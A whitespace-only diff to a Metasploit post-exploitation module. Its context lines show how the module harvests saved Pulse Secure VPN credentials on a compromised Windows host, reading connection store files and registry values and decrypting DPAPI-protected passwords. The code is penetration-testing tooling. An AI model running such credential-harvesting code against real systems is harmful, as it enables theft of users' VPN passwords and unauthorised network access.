@@ -38,7 +38,6 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_reg(data, entropy)
-    
     # decrypt value using CryptUnprotectData
     rg = session.railgun
     pid = session.sys.process.getpid
@@ -91,7 +90,6 @@ class MetasploitModule < Msf::Post
   def get_ives
     # parse connection profiles from Pulse Secure connection store and returns them
     # in a dict, indexed by connection identifier.
-    
     connstore_paths = [
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.dat",
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.bak",
@@ -178,11 +176,10 @@ class MetasploitModule < Msf::Post
       key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
       Array(key_names).each do |key_name|
         ive_index = key_name[4..-1] # remove 'ive:'
-          
         # We get the encrypted password value from registry
         reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
         vals = registry_enumvals(reg_path, "")
-        
+
         if vals
           vals.each do |val|
             data = registry_getvaldata(reg_path, val)
@@ -204,7 +201,7 @@ class MetasploitModule < Msf::Post
             if not data.starts_with?("\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8Cz\x00\xC0O\xC2\x97\xEB")
               next
             end
-           
+
             decrypted = decrypt_reg(data, entropy)
             if decrypted != ""
               if not ives.key?(ive_index)
